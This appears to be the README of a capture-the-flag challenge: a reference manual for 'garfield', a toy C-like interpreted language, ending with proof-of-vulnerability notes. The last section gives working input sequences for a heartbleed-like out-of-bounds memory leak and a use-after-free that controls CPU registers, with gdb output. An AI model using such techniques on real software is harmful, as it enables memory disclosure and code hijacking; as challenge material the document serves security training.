# garfield

This challenge is an interpreter for a language much like c in syntax

inspiration from here: https://github.com/lsegal/my_toy_compiler

## Scope for Analysis

All interactions between the client and the server are in scope.

This challenge does not contain privileged information aside from the data in ``/token`` nor does it maintain persistent data.

## Statements

All statments including function declarations must end with a semicolon (';').

## Contexts

The garfield language has a global and a function context. If a variable or a function is declared within a function it is only available during that function's active lifetime and not accessible globally or by other functions. If declared globally however, the variable or function is available to all called functions as well as at the prompt.

## Function declarations

Functions can return any of 4 types: "int", "double", "string", "void".

The "void" return type indicates that there will not be a "return" statement.

An exception will be thrown if the returned value does not match the return type defined by the function.

## Return values

If a function has a non-void return type then there needs to be a "return" statement of that type. The "return" statement requires an expression so void type functions do not use them.

## Variable types

There are three variable types:

integers: int a = 5;
doubles: double a = 5.0;
strings: string a = "hello world";
	Strings can contain escape characters such as \t, \n, and \x##

### Lists

Lists are composed of integers, doubles, strings, and other lists:

>>> list a = [ 1, 2, 3, "hello world"];
>>> list b = [ 4, "what", a, 10];
>>> putl(b);
[ 4, "what", [ 1, 2, 3, "hello world" ], 10 ]
>>> puts(type(b));
list

Lists can be added

>>> list a = [ 1, 2, 3];
>>> list b = [4, 5, 6];
>>> putl(a + b);
[ 1, 2, 3, 4, 5, 6 ]
>>>

### Operations

Integers and doubles can be added, subtracted, multiplied, and divided. Integers also have the modulo operation. If an operation is between an integer and a double then the double is converted to an integer. Strings can be added together or they can be multiplied by an integer.

>>> int a = 10 % 2;
>>> puti(a);
0
>>> puti( 10 % 3 );
1

## If .. else

The if condition expression needs to return either an integer or a double otherwise an exception will be thrown.

int x = 4; if ( x == 4 ) { <execute this>; };

double x = 4.0; if ( x == 4.0 ) { <execute this>; };

>>> string s = "hello";
>>> if ( s == "hello" ) { puts("true"); } else { puts("false"); };
true
>>> int i = 24;
>>> if ( i < 10 ) { puts("true"); } else { puts("false"); };
false

## while

The while condition expression has the same constraints as that of the "if" conditional.

The while block will execute until the condition evaluates to 0.

>>> int i = 0;
>>> while ( i < 5 ) { puti(i); i = i + 1; };
0
1
2
3
4

>>> string s = "";
>>> while ( len(s) < 5) { s = s + "a"; };
>>> puts(s);
aaaaa

## do..while
This behaves the same as other do while constructs

>>> int i = 4; do { i = i - 1; puti(i); } while( i > 0);
3
2
1
0
>>>

## for loops

for loops operate much like their c counterparts. However, you cannot declare a new variable in the initialize location and all three positions require an expression.

for ( init ; condition; increment) { <statements>; };

>>> int i = 0;
>>> for( i = 0; i < 5; i = i + 1 ) { puti(i); };
0
1
2
3
4

## foreach

This expects a list type. It loops through each element and assigns it to the variable name '$$'.

>>> list a = [1, 2, 3, 4];
>>> foreach(a) { puti($$); };
1
2
3
4
>>>

Here is a complicated one that declares a function that takes a list and prints it out based on the type

>>> void printlist( list l ) { foreach(l) { if ( type($$) == "int" ) { puti($$); }; if ( type($$) == "string" ) { puts($$); }; if ( type($$) == "double" ) { putd($$); }; if ( type($$) == "list") {putl($$);};}; };
>>> printlist( [1, 3.4, "hello", [5, 4, 5.6]]);
1
3.400000
hello
[5, 4, 5.600000]
>>>

## built-in functions

### puts

The puts(string) function expects a string argument that is printed to stdout. The function returns the count of bytes printed.

### puti

The puti(int) function expects an integer argument that is printed to stdout. The function returns the count of bytes printed.

### putd

The putd(double) function expects a double argument that is printed to stdout. The function returns the count of bytes printed.

### putl

int putl(list) pretty prints a list to stdout.

>>> list a = [ 1, 2, 3, "hello world"];
>>> list b = [ 4, "what", a, 10];
>>> putl(b);
[ 4, "what", [ 1, 2, 3, "hello world" ], 10 ]
>>> putl([1, 2, 3, 4]);
[ 1, 2, 3, 4 ]

### len

The len( * ) function takes a variable and returns its length.
For strings this is the number of characters, for lists, the number of elements, and for integers and doubles it is the size of their data type.


>>> int a = 5;
>>> double b = 5.0;
>>> string c = "hello world";
>>> list d = [a, b, c];
>>> puti( len(a) );
8
>>> puti( len(b) );
8
>>> puti( len(c) );
11
>>> puti( len(d) );
3
>>>

### atoi

The atoi(string) function expects a string argument. The string is converted to an integer and returned to the calling function.

### substr

The substr(string, int, int) expects a string followed by the desired starting offset and length arguments. I will return the substring created by the requested arguments.
An exception will be thrown if the starting offset is beyond the length of the string.

### strstr

int strstr(string a, string b);

Returns an index into string a where b begins or -1 if it wasn't found.

>>> string b = "hello world";
>>> int a = strstr(b, "o wo");
>>> puti(a);
4
>>> a = strstr(b, "asdf");
>>> puti(a);
-1

### setchr

THe setchr(string, string, int) function replaces the offset indicated by the third argument in the first argument string with the character specified by the second argument.
An exception will be thrown if the offset is beyond the bounds of the string or if the second argument is more or less than a single character.

### itos
string itos(int) converts an integer to a string

### dtos
string dtos(double) converts a double to a string

### type

string type(* ) takes a variable of any type and returns its type as a string.


>>> int a = 5;
>>> double b = 5.0;
>>> string c = "hello world";
>>> list d = [1, 2, 3, 4];
>>> puts(type(a));
int
>>> puts(type(b));
double
>>> puts(type(c));
string
>>> puts(type(d));
list

### append

int append( list, * ) takes a list and a variable of any other type then appends it to the list

>>> list a = [1,2];
>>> append(a, a);
>>> putl(a);
[ 1, 2, [ 1, 2 ] ]
>>> append(a, 5);
>>> putl(a);
[ 1, 2, [ 1, 2 ], 5 ]
>>> list a = [1, 2 ];
>>> list b = [6, "hello"];
>>> append(a, b);
>>> putl(a);
[ 1, 2, [ 6, "hello" ] ]
>>> append(a, 10);
>>> putl(a);
[ 1, 2, [ 6, "hello" ], 10 ]
>>>

### prepend

int prepend( list, * ) takes a list and a variable of any other type then prepends it to the list

>>> list a = [1,2];
>>> prepend(a, "hello");
>>> putl(a);
[ "hello", 1, 2 ]
>>>

### popend

* popend( list ) takes a list, pops the final value and returns it. An execption is thrown if the list is empty

>>> list a = [1, 2, 3];
>>> int b = popend(a);
>>> puti(b);
3
>>> putl(a);
[ 1, 2 ]
>>>

### popfront
* popfront( list ) takes a list, pops the first value and returns it. An execption is thrown if the list is empty

>>> list a = [1,2,3];
>>> int b = popfront(a);
>>> puti(b);
1
>>> putl(a);
[ 2, 3 ]
>>>

### getbyindex

* getbyindex( list, int ) takes a list and an integer. It returns the indexed value or throws an exception if out of bounds.

>>> list a = [1, 2, 3];
>>> puts( type( getbyindex(a, 2)));
int
>>> int b = getbyindex(a, 1);
>>> puti(b);
2
>>>

### exists

int exists( list, * ) takes a list and a variable. Returns 1 if the value is in the list, 0 if not

>>> list a = [1, 2, 3];
>>> int b = 1;
>>> puti( exists(a, b) );
1
>>> string c = "hello";
>>> puti( exists( a, c ) );
0
>>>

### erase

void erase( list, int ) takes a list and an integer used as an index. The element at index is deleted and nothing is returned. An exeception is thrown if the index is out of bounds.

>>> list a = [ 1, 2, 3, ["hello", 5], 6.0];
>>> putl(a);
[1, 2, 3, ["hello", 5], 6.000000]
>>> puti( erase( a, 2) );
4
>>> putl(a);
[1, 2, ["hello", 5], 6.000000]
>>>

### str

string str( * ) takes a variable and returns its representation as a string

>>> int a = 5;
>>> puts(str(a));
5
>>> double b = 5.0;
>>> puts(str(b));
5.000000
>>> string c = "hello world";
>>> puts(str(c));
"hello world"
>>> list d = [a, b, c];
>>> puts(str(d));
[5, 5.000000, "hello world"]
>>>

### strtok

list strtok( string, string ) takes two strings, the first is the string to be tokenized the second are the tokens. It returns a list of the tokenized strings

>>> string a = "hello world how are you today?";
>>> string b = " ";
>>> list c = strtok(a, b);
>>> putl(c);
["hello", "world", "how", "are", "you", "today?"]
>>>

### tolower

void tolower( string ) takes a string and converts the characters to lower case

>>> string a = "HELLO wOrLd";
>>> tolower(a);
>>> puts(a);
hello world
>>>

### toupper

void toupper( string ) takes a string and converts the characters to upper case

>>> string a = "hello world";
>>> toupper(a);
>>> puts(a);
HELLO WORLD
>>>

### hex

string hex( int ) takes an integer and returns the hex representation as a string

>>> int i = -10;
>>> puts(hex(i));
-0xa
>>> puts(hex(123456));
0x1e240
>>>

### oct

string oct( int ) takes an integer and returns the octal represtenation as a string

>>> puts(oct(123));
0o173
>>> puts(oct(-123));
-0o173
>>>

### sum

int sum( list ) takes a list of integers and returns their sum

>>> list a = [4, 5, 6, 7, 9];
>>> puti(sum(a));
31
>>> list b = [6, 7, 8.0];
>>> puti(sum(b));
exception: encountered a non-int type
>>>

### max

int max(int, int) takes two integers and returns the maximum

>>> puti(max(10,15));
15
>>> puti(max(15,10));
15
>>>

### min

int min(int, int) takes two integers and returns the minimum

>>> puti(min(10,15));
10
>>> puti(min(15,10));
10
>>>

### bin

string bin( int ) takes an integer and returns the binary representation as a string

>>> puts(bin(21));
0b10101
>>> puts(bin(-21));
-0b10101
>>>

# POVs Apogee Only

## POV 1

CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
Information Disclosure

This bug is very similar to the heartbleed bug from several years ago.
An attacker first creates a string variable type.
>>> string s = "hello";

Then using the substr() function they can specify a starting offset and a length to copy. As long as the starting offset is within the bounds of the string then they can copy as many bytes beyond the string as they like.

>>> string y = substr(s, 4, 500);
>>> puti(len(y));
500
>>>

However, because most of memory are NULL bytes this doesn't leak anything on its own.

>>> puts(y);
o
>>>

Using the setchr() function the attacker can progressively set the NULL bytes to a non-NULL value until data is leaked.
>>> setchr(y, "A", 1);
>>> puts(y);
oA
>>>
....
>>> setchr(y, "A", 1);
>>> puts(y);
oAAAAAAAAAAAAAAAAAAAQ
>>>

The 'Q' character at the end is a leaked value. The pov uses some heuristics to guess if a value is likely to be an address and prints it to the screen.

## POV 2

CWE-416: Use After Free
Data Misuse

Each element in a list type is a pointer to a Value class.
>>> list a = [1,2,3];

When the function getbyindex() is called it returns a pointer to the value and not a copy.
>>> int i = getbyindex(a,0);

If an attacker saves a reference to the value and subsequently deletes that value from the list via the erase() function then a reference to the deleted value is still available.

>>> erase(a, 0);

Each Value class has a size of 56 bytes so if the attacker then creates a string of 55 bytes then the previously deleted value will be allocated and overwritten with the string contents.

>>> string s = "bbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggstrnaa";

An important bit here is the "strn" bytes which tell the variable "i" that it is a string type. Now, attempting to overwrite it with another string will gain control of the rcx and rdi registers:

Because of the way the allocations work this should all be send as a single command:

>>> list a = [1,2,4]; int i = getbyindex(a,0); erase(a, 0); string s = "bbbbbbbbccccccccddddddddeeeeeeeeffffffffggggggggstrnaa"; i = "zzzzzzzz";

(gdb) x /i $pc
=> 0x7ffff75cfa9b <__memmove_avx_unaligned_erms+139>:	mov    %rcx,-0x8(%rdi,%rdx,1)
(gdb) i r $rdi $rcx
rdi            0x6464646464646464	7234017283807667300
rcx            0x7a7a7a7a7a7a7a7a	8825501086245354106
(gdb)